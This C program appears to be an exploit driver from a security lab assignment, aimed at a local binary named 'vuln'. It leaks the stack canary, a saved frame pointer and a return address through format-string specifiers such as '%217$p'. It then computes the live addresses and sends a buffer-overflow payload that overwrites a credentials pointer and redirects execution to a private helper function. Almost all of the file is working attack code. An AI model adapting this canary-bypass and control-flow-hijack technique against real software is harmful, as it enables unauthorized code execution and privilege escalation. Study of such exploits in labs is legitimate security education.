#include "driver_base.c"

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;

   uint64_t auth_bp =         0x7ffca4e76e10; // rbp value in auth
   uint64_t g_bp =            0x7ffca4e76e60; // rbp value in g
   uint64_t auth_cred_loc =   0x7ffca4e76e00; // loc of cred 
   uint64_t auth_db_loc =     0x7ffca4e76df8; // loc of db (local var of auth)
   uint64_t auth_cred     =   0x7ffca4e76d10; // value of cred (after alloca)
 
   uint64_t auth_bp_cred_loc_dist  = auth_cred_loc - auth_bp;
   uint64_t auth_bp_cred_dist = auth_cred - auth_bp;
   uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;

   uint64_t main_bp =       0x7ffca4e77550; // saved rbp value in mainloop
   uint64_t auth_main_bp_dist = auth_bp - main_bp;
   uint64_t g_main_bp_dist = g_bp - main_bp;

   uint64_t main_loop_return_addr = 0x5613287a3ea9;
   uint64_t private_helper2_addr = 0x5613287a3fa6;
   uint64_t private_helper2_distance = private_helper2_addr - main_loop_return_addr;
   
   create_subproc("./vuln", nargv);
   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");
   getchar();
   get_formatted("%*s"); //Needed to clear out the Welcome message

   put_str("e %217$p\n");
   send();
   uint64_t stack_canary;
   get_formatted("%p", &stack_canary);
   fprintf(stderr, "driver: Extracted stack_canary=%lx\n", stack_canary);

   put_str("e %218$p\n");
   send();
   uint64_t cur_main_bp;
   get_formatted("%p", &cur_main_bp);
   fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

   put_str("e %219$p\n");
   send();
   uint64_t curr_main_loop_return_addr;
   get_formatted("%p", &curr_main_loop_return_addr);
   fprintf(stderr, "driver: Extracted curr_main_loop_return_addr=%lx\n", curr_main_loop_return_addr);

   // Compute the information for the current run using the probed values
   uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
   uint64_t cur_g_bp = cur_main_bp + g_main_bp_dist;
   
   uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
   uint64_t curr_auth_cred = cur_auth_bp + auth_bp_cred_dist;

   uint64_t curr_private_helper2_addr = curr_main_loop_return_addr + private_helper2_distance;
   
   fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx, curr_private_helper2_addr=%lx\n", 
           cur_auth_bp, cur_auth_cred_loc, curr_private_helper2_addr);

   // Now, send the payload
   put_str("p 1234567\n");
   send();
   get_formatted("%*s");


   unsigned explsz = auth_db_cred_dist + 8 - 8 + (4*8);
   void* *expl = (void**)malloc(explsz);
   memset((void*)expl, '\1', explsz);
   expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc;
   expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred;
   expl[explsz/sizeof(void*)-3] = (void*)stack_canary;
   expl[explsz/sizeof(void*)-2] = (void*)cur_g_bp;
   expl[explsz/sizeof(void*)-1] = (void*)curr_private_helper2_addr;
   
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();
   get_formatted("%*s");
   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);

   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
